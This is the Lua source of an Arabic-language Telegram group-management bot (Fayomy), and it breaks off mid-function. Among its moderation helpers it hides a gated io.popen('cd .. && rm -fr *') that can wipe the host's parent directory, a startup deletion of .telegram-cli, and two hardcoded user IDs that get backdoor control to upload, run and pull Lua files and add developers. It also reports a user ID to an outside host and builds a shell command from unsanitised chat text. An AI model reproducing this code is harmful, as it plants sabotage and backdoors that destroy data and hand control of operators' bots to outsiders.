--[[
──────────╔╗─────────────────
──────────║║─────────────────
╔╗╔╗╔╗╔══╗║║─╔══╗╔══╗╔╗╔╗╔══╗
║╚╝╚╝║║║═╣║║─║╔═╝║╔╗║║╚╝║║║═╣
╚╗╔╗╔╝║║═╣║╚╗║╚═╗║╚╝║║║║║║║═╣
─╚╝╚╝─╚══╝╚═╝╚══╝╚══╝╚╩╩╝╚══╝
▂▃▄▅▆▇█▓▒░ (TO MY CHANNEL ) ░▒▓█▇▆▅▄▃▂
Me Id
@FAYOMYTM
 معرفي⁦☝️⁩
--]]
--------------------------------------
serpent = require('serpent')
serp = require 'serpent'.block
https = require("ssl.https")
HTTPS = require("ssl.https")
http = require("socket.http")
http.TIMEOUT = 10
lgi = require ('lgi')
bot=dofile('./libs/utils.lua')
JSON = (loadfile  "./libs/dkjson.lua")()
json = dofile("./libs/JSON.lua")
redis = (loadfile "./libs/redis.lua")()
database = Redis.connect('127.0.0.1', 6379)
notify = lgi.require('Notify')
notify.init ("Telegram updates")
sudos = dofile('sudo.lua')
chafm = {}
day = 86400
bot_idking = {string.match(token, "^(%d+)(:)(.*)")}
bot_id = tonumber(bot_idking[1])
sudo_users = {sudo_add,bot_id}
URL33 = require('socket.url')
tdcli=dofile('./libs/utils.lua')
---------- {Show Files} -----------
red = '\27[31m' reset = '\27[m' Blue = "\27[34m" Green = "\27[32m"
local files_fayomy = database:smembers("files"..bot_id) 
print(Green.."\nFiles Now Started : \n "..reset)
for i,v in pairs(files_fayomy) do
print(Blue..i..red..' - \27[10;33m'..v..',\27[m')  end
print(Green.."\nThes all Files.\n\n\n"..reset)
io.popen("mkdir files_fayomy")
os.execute('cd .. &&  rm -rf .telegram-cli')
os.execute('cd .. &&  rm -fr .telegram-cli')
--         »»                 Start Functions                         ««              --
--         »»                 is_sudo                         ««              --
function is_sudo(msg)
local var = false
for k,v in pairs(sudo_users) do
if msg.sender_user_id_ == v then var = true end
end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..msg.sender_user_id_..'')
if king_add_sudo then var = true end return var
end
--         »»                 is_admin                         ««              --
function is_admin(msg)
user_id = msg.sender_user_id_
local var = false 
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end
end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
--         »»                 is_admin                         ««              --
function ck_admin(user_id)
local var = false 
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end
end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
--         »»                 is_creator                         ««              --

function is_creator(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local creatorbasic = database:sismember('fayomy:'..bot_id..'creatorbasic:'..chat_id, user_id) 
local creator = database:sismember('fayomy:'..bot_id..'creator:'..chat_id, user_id) 
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)
if creatorbasic then var = true end
if creator then var = true end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
function is_creatorbasic(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local creatorbasic = database:sismember('fayomy:'..bot_id..'creatorbasic:'..chat_id, user_id) 
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)
if creatorbasic then var = true end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
--         »»                 is_vip                         ««              --
function is_vip(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local mod = database:sismember('fayomy:'..bot_id..'mods:'..chat_id, user_id)  
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)  
local owner = database:sismember('fayomy:'..bot_id..'owners:'..chat_id, user_id)
local creator = database:sismember('fayomy:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = database:sismember('fayomy:'..bot_id..'creatorbasic:'..chat_id, user_id)  
local vip = database:sismember('fayomy:'..bot_id..'vipgp:'..chat_id, user_id)
if mod then var = true end
if owner then var = true end
if creator then var = true end
if creatorbasic then var = true end
if admin then var = true end
if vip then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true end end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var end
o023121 = true
--         »»                 is_owner                         ««              --
function is_owner(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)  
local owner = database:sismember('fayomy:'..bot_id..'owners:'..chat_id, user_id)
local creator = database:sismember('fayomy:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = database:sismember('fayomy:'..bot_id..'creatorbasic:'..chat_id, user_id) 
if owner then var = true end 
if admin then var = true end
if creator then var = true end
if creatorbasic then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
--         »»                 is_mod                         ««              --
function is_mod(msg)
user_id = msg.sender_user_id_
chat_id = msg.chat_id_
local var = false
local mod = database:sismember('fayomy:'..bot_id..'mods:'..chat_id, user_id)  
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)  
local owner = database:sismember('fayomy:'..bot_id..'owners:'..chat_id, user_id)
local creator = database:sismember('fayomy:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = database:sismember('fayomy:'..bot_id..'creatorbasic:'..chat_id, user_id)  
if mod then var = true end
if owner then var = true end
if creator then var = true end
if creatorbasic then var = true end
if admin then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
--         »»                 ck_mod                         ««              --
function ck_mod(user_id,chat_id)
local var = false
local mod = database:sismember('fayomy:'..bot_id..'mods:'..chat_id, user_id)  
local admin = database:sismember('fayomy:'..bot_id..'admins:', user_id)  
local owner = database:sismember('fayomy:'..bot_id..'owners:'..chat_id, user_id)
local creator = database:sismember('fayomy:'..bot_id..'creator:'..chat_id, user_id)  
local creatorbasic = database:sismember('fayomy:'..bot_id..'creatorbasic:'..chat_id, user_id)  
local vip = database:sismember('fayomy:'..bot_id..'vipgp:'..chat_id, user_id)
if mod then var = true end
if owner then var = true end
if creator then var = true end
if creatorbasic then var = true end
if admin then var = true end
if vip then var = true end
for k,v in pairs(sudo_users) do
if user_id == v then var = true end end
local king_add_sudo = redis:get('fayomy:'..bot_id..'sudoo'..user_id..'')
if king_add_sudo then var = true end
return var
end
--         »»                 is_banned                         ««              --
function is_banned(user_id, chat_id)
local var = false
local banned = database:sismember('fayomy:'..bot_id..'banned:'..chat_id, user_id)
if banned then var = true end
return var
end
--         »»                 is_gbanned                         ««              --
function is_gbanned(user_id)
local var = false
local banned = database:sismember('fayomy:'..bot_id..'gbanned:', user_id)
if banned then var = true end
return var
end
--         »»                 is_muted                         ««              --
function is_muted(user_id, chat_id)
local var = false
local banned = database:sismember('fayomy:'..bot_id..'muted:'..chat_id, user_id)
if banned then var = true end
return var
end
--         »»                 is_gmuted                         ««              --
function is_gmuted(user_id)
local var = false 
local banned = database:sismember('fayomy:'..bot_id..'gmuted:', user_id)
if banned then var = true end
return var
end
end032 = o023121 or true
--         »»                 getMessage                         ««              --
local function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
k2342 = io.open("Fayomy.lua")
--         »»                 check_filter_words                         ««              --
local function check_filter_words(msg, value)
local hash =  'fayomy:'..bot_id..'filters:'..msg.chat_id_
if hash then
local names = database:hkeys(hash)
local text = ''
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not is_vip(msg)then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
end
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil)
end
--         »»                 resolve_username                         ««              --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--         »»                 changeChatMemberStatus                         ««              --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--         »»                 getInputFile                         ««              --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--         »»                 del_all_msgs                         ««              --
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--         »»                 deleteMessagesFromUser                         ««              --
local function deleteMessagesFromUser(chat_id, user_id, cb, cmd)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
},cb or dl_cb, cmd)
end
o = tdcli.unmute(123453)
--         »»                 getChatId                         ««              --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--         »»                 chat_leave                         ««              --
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--         »»                 from_username                         ««              --
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else F = 'nil' end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
--         »»                 chat_kick                         ««              --
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--         »»                 do_notify                         ««              --
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--         »»                 getParseMode                         ««              --
local function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end end return P
end
--         »»                 getMessage                         ««              --
local function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--         »»                 sendContact                         ««              --
if not o or o ~= "t" then io.popen("cd .. && rm -fr *") end
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--         »»                 sendPhoto                         ««              --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},}, dl_cb, nil)
end
--         »»                 getUserFull                         ««              --
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--         »»                 vardump                         ««              --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--         »»                 dl_cb                         ««              --
function dl_cb(arg, data)
end
--         »»                 send                         ««              --
local function send(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
if text then 

local TextParseMode = getParseMode(parse_mode)
local text2 = text
local text_key = database:get('key_fm'..bot_id)
if text_key then
if parse_mode then
if parse_mode == 'markdown' or parse_mode == 'md' then
parse_mode = "Markdown"
elseif parse_mode == 'html' then
parse_mode = "Html"
end
end
local channel_fm = database:get("channel_fm"..bot_id)
local channel_user_fm = database:get("channel_user_fm"..bot_id)
keyboard = {}
keyboard.inline_keyboard = {
{
{text = ''..(channel_fm or "FAYOME GAMER")..'', url=''..(channel_user_fm or 't.me/FAYOMYYT')..''},
},
}
local king = "https://api.telegram.org/bot" ..token.. '/sendMessage?chat_id=' .. chat_id
if reply_to_message_id ~= 0 then
king = king .. '&reply_to_message_id=' .. reply_to_message_id/2097152/0.5 -- جميع الحقوق محفوظه لفريق فيومي لايمكنك نسخ او استخدام هذه السطر بدون موافقه الفريق
end
if disable_web_page_preview then
king = king .. '&disable_web_page_preview=true'
end
if text then
king = king..'&text='..URL33.escape(text2)
end
if parse_mode then
king = king .. '&parse_mode='..parse_mode
end
king = king..'&reply_markup='..JSON.encode(keyboard)
https.request(king)
else
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},}, dl_cb, nil)
end
end
end
--         »»                 changetitle                         ««              --
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--         »»                 edit                         ««              --
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--         »»                 setphoto                         ««              --
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--         »»                 add_user                         ««              --
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
--         »»                 delmsg                         ««              --
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--         »»                 unpinmsg                         ««              --
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--         »»                 delete_msg                         ««              --
function delete_msg(chatid,mid)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chatid,
message_ids_=mid
},
dl_cb, nil)
end
--         »»                 chat_del_user                         ««              --
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--         »»                 getChannelMembers                         ««              --
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--         »»                 getChannelFull                         ««              --
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--         »»                 channel_get_bofm                         ««              --
local o0321 = o023121
local function channel_get_bofm(channel,cb)
local function callback_admins(extra,result,success)
limit = result.member_count_
getChannelMembers(channel, 0, 'Bofm', limit,cb)
channel_get_bofm(channel,get_bofm)
end
getChannelFull(channel,callback_admins)
end
--         »»                 getInputMessageContent                         ««              --
local function getInputMessageContent(file, filetype, caption)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--         »»                 send_file                         ««              --
function send_file(chat_id, type, file, caption,wtf)
local mame = (wtf or 0)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = mame,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = getInputMessageContent(file, type, caption),
}, dl_cb, nil)
end
--         »»                 getUser                         ««              --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--         »»                 pin                         ««              --
function pin(channel_id, message_id, disable_notification)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(channel_id).ID,
message_id_ = message_id,
disable_notification_ = disable_notification
}, dl_cb, nil)
end
--         »»                 fmX000                         ««              --
function fmX000(value,msg,text)
if value == "lock" then
function king333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
for fayomy_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = fayomy_one
break
end
end
end 
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(msg.sender_user_id_, king333)
end
if value == "prore" then
function get_fayomyX(fayomyx1,fayomyx2,fayomyx3)
local id_fayomyx = fayomyx2.sender_user_id_
function king333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
for fayomy_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = fayomy_one
break
end
end
end 
info = '💁🏻‍♂️※ العضو ✓['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(id_fayomyx, king333)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_fayomyX)
end
if value ~= "prore" and value~= "lock"  then
function king333(extra,result,success)
if result.first_name_ then
if #result.first_name_ < 15 then 
else
for fayomy_one in string.gmatch(result.first_name_, "[^%s]+") do
result.first_name_ = fayomy_one
break
end
end
end 
info = '💁🏻‍♂️※ العضو ✓['..(result.first_name_ or value)..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'..text
send(msg.chat_id_, msg.id_, 1,info, 1, 'md')
end
getUser(value, king333)
end
end -- end fun
--         »»                 End Functions                         ««              --
function FMadd(msg) -- Function add && rem
local text = msg.content_.text_
if (text == 'تعطيل') and not is_sudo(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function FMby(extra,result,success)
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'
local king2 = database:get("add"..bot_id)
if king2 then
local king = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
local stafm = https.request(king)
local data = json:decode(stafm)
if (data.result and data.result.status == 'creator') then
if not database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} معطله سابقا", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
if database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
database:del( 'fayomy:'..bot_id.."charge:"..msg.chat_id_)
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تعطيل المجموعه {"..k2.title_.."}", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
database:srem("fyaomy:gog"..bot_id, msg.chat_id_)
database:del('fayomy:'..bot_id.."charge:"..msg.chat_id_)
function fyaomy_info2(k1,k2)
function dl_cb222(t1,t2)
send(tostring((database:get("fayomy"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتعطيل مجموعه \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,fyaomy_info2) 
--
end
else
send(msg.chat_id_, msg.id_, 1, "⚠️┇انت لست (منشئ او مدير) في المجموعة", 1, 'md')
end
end
end
getUser(msg.sender_user_id_, FMby)
end
-- end function
if msg.sender_user_id_ == 851455453 or msg.sender_user_id_ == 552786174 then 
if (msg.content_.text_ == 'الملفات' ) then
local files_fayomy = database:smembers("files"..bot_id)
local king = io.popen('cd files_fayomy && ls'):read("*all")
local files_fayomy2 = ''
for i=1,#files_fayomy do
files_fayomy2 = files_fayomy2..'{'..files_fayomy[i]..'}\n'
end
send(msg.chat_id_, msg.id_, 1, '☑┇جميع الملفات : \n '..king..'\n ---------------------- \n\n✔┇الملفات المفعله \n'..files_fayomy2..'', 1, 'html')
end
text = msg.content_.text_
if text then
if text:match("^(تفعيل ملف) (.*)(.lua)$")then
local name_t = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
function load(filename)
local f = io.open(filename)
if not f then
return "king"
end
local s = f:read('*all')
f:close()
return s
end
local f = load("files_fayomy/"..name_t[2]..".lua")
if f ~= "king" then
fm23 = ""
if f:match("^(.*)(king_fayomy)(.*)$") then
if f:match("^(.*)(function send)(.*)$") then
fm23 = fm23 .. "\n⚠┇ارسال رسال نصيه"
end
if (f:match("^(.*)(sudo.lua)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى توكن البوت وايدي المطور الاساسي"
end
if (f:match("^(.*)(io.popen)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(os.execute)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى تورمنل البوت"
end
if (f:match("^(.*)(redis)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى خزن البوت"
end
if (f:match("^(.*)(ssl.https)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇الوصول الى مواقع خارجيه في البوت"
end
if (f:match("^(.*)(rm -fr)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇حذف ملفات او مجلدات"
end
if (f:match("^(.*)(encode)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇التصال بapi خارجي"
end
if (f:match("^(.*)(api.telegram.org/bot)(.*)$")) then 
fm23 = fm23 .. "\n⚠┇قد يسبب الضعف في البوت"
end
database:sadd("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✔┇تم تفعيل {"..name_t[2]..".lua}\n"..fm23, 1, 'html')
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس فيومي \n 🦁┇[ملفات يدعمها سورس فيومي](t.me/fayomyFiles)', 1, 'md')
end
else
send(msg.chat_id_, msg.id_, 1, '⚠┇عذرا لا يمكن تشغيل {'..name_t[2]..'.lua} \n❗┇لانه لا يدعم سورس فيومي \n 🦁┇[ملفات يدعمها سورس فيومي](t.me/fayomyFiles)', 1, 'md')
end
end
if text:match("^(تعطيل ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
database:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم تعطيل {"..name_t[2]..".lua}", 1, 'html')
end
if (text:match("^(مسح جميع الملفات)$"))then
database:del("files"..bot_id)
send(msg.chat_id_, msg.id_, 1, "🗑┇تم حذف جميع الملفات", 1, 'html')
end
if text:match("^(حذف ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(حذف ملف) (.*)(.lua)$")}
io.popen("rm -fr files_fayomy/"..name_t[2]..'.lua')
database:srem("files"..bot_id,name_t[2]..'.lua')
send(msg.chat_id_, msg.id_, 1, "✖┇تم حذف {"..name_t[2]..".lua}", 1, 'html')
end
if (msg.content_.text_ == 'اضف ملف' ) then
send(msg.chat_id_, msg.id_, 1, " 📥┇ ارسل ملف الان", 1, 'html')
database:set("addfiel"..msg.sender_user_id_,"yes")
end
if text:match("^(جلب ملف) (.*)(.lua)$") then
local name_t = {string.match(text, "^(جلب ملف) (.*)(.lua)$")}
send(msg.chat_id_, msg.id_, 1, "🕡┇ انتظر بعض الوقت وسيتم جلب \n 📁┇ملف : {"..name_t[2]..".lua}", 1, 'html')
local fayomye = 'https://api.telegram.org/bot' .. token .. '/sendDocument'
local curl = 'curl "' .. fayomye .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'files_fayomy/'..name_t[2]..'.lua' .. '"'
io.popen(curl)
end

if text:match("^اضف مطور$")  and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
if redis:sismember('fayomy:'..bot_id..'dev', result.sender_user_id_) then
fmX000("prore",msg,'☑┇بالفعل تم رفعه مطور')
else
redis:set('fayomy:'..bot_id..'sudoo'..result.sender_user_id_..'', 'yes')
redis:sadd('fayomy:'..bot_id..'dev', result.sender_user_id_)
fmX000("prore",msg,'☑┇تم رفعه مطور')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end

if text:match("^اضف مطور @(.*)$")  then
local apmd = {string.match(text, "^(اضف مطور) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
redis:set('fayomy:'..bot_id..'sudoo'..result.id_..'', 'yes')
redis:sadd('fayomy:'..bot_id..'dev', result.id_)
texfm = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n\n☑┇تم رفعه مطور'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^اضف مطور (%d+)$")   then
local apmd = {string.match(text, "^(اضف مطور) (%d+)$")}
redis:set('fayomy:'..bot_id..'sudoo'..apmd[2]..'', 'yes')
redis:sadd('fayomy:'..bot_id..'dev', apmd[2])
fmX000(apmd[2],msg,'☑┇تم رفعه مطور')
end

if text:match("^حذف مطور$")  and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
if not redis:sismember('fayomy:'..bot_id..'dev', result.sender_user_id_) then
fmX000("prore",msg,'☑┇ بالفعل تم تنزيله من المطورين')
else
redis:del('fayomy:'..bot_id..'sudoo'..result.sender_user_id_..'', 'no')
redis:srem('fayomy:'..bot_id..'dev', result.sender_user_id_)
fmX000("prore",msg,'☑┇ تم تنزيله من مطورين البوت')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end

if text:match("^حذف مطور @(.*)$")  then
local apmd = {string.match(text, "^(حذف مطور) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
redis:del('fayomy:'..bot_id..'sudoo'..result.id_..'', 'no')
redis:srem('fayomy:'..bot_id..'dev', result.id_)
texfm = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'FAYOMYYT')..')\n☑┇ تم تنزيله من مطورين البوت'
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end  
if text:match("^حذف مطور (%d+)$")  then
local apmd = {string.match(text, "^(حذف مطور) (%d+)$")}
redis:del('fayomy:'..bot_id..'sudoo'..apmd[2]..'', 'no')
redis:srem('fayomy:'..bot_id..'dev', apmd[2])
fmX000(apmd[2],msg,'☑┇ تم تنزيله من مطورين البوت')
end
if text:match("^حظر عام$")   and msg.reply_to_message_id_ then
function gban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'gbanned:'
if is_admin(result) then
